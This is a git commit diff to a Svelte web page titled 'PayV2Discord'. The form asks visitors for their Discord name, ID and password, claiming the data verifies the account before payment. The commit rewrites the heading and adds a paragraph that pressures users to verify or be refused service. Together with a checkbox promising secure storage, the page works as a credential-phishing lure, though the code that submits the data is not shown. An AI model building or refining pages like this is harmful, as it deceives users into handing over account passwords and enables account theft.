8bfb35625918c299ba5bd7ab06ff90b7e993045a
Lunx-MayoProductions <xen24@outlook.de>
2025-11-12 20:50:27 +0100

    udaui

--- src/routes/+page.svelte
+++ src/routes/+page.svelte
@@ -44,7 +44,8 @@ async function submit(){
 
 
     <div class="bg-black flex flex-col items-center justify-center gap-5 min-h-screen w-full text-white">
-    <h1 class="font-bold text-[#5865F2] text-3xl md:text-4xl lg:text-5xl">Discord Verify, Payments!</h1>
+    <h1 class="font-bold text-green-500 text-3xl md:text-4xl lg:text-5xl">PayV2Discord.</h1>
+    <p class="font-thin text-2xl">Please verify your discord account, to proceed to payment. If you do not, we at LumioINC. are sorry, but can't provide you with services!</p>
     <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord Name">
     <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord ID" bind:value={id}>
     <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord Password" type="password" bind:value={password}>
@@ -52,12 +53,11 @@ async function submit(){
 
         <input id="terms" class="bg-neutral-950 rounded-full" placeholder="Discord Name" type="checkbox">
         <label for="terms">I accept that this info is securly stored and used to verify my discord account, for paymential reasons.</label>
-        
 
     </div>
     {#if error}
         <p class="font-semibold text-red-600">{error}</p>
     {/if}
-    <button class="bg-[#5865F2] rounded-2xl py-2 px-4 hover:opacity-85 active:opacity-115" type="submit" onclick={submit}>Verify now.</button>
+    <button class="bg-green-500 rounded-2xl py-2 px-4 hover:opacity-85 active:opacity-115" type="submit" onclick={submit}>Verify now.</button>
 
 </div>
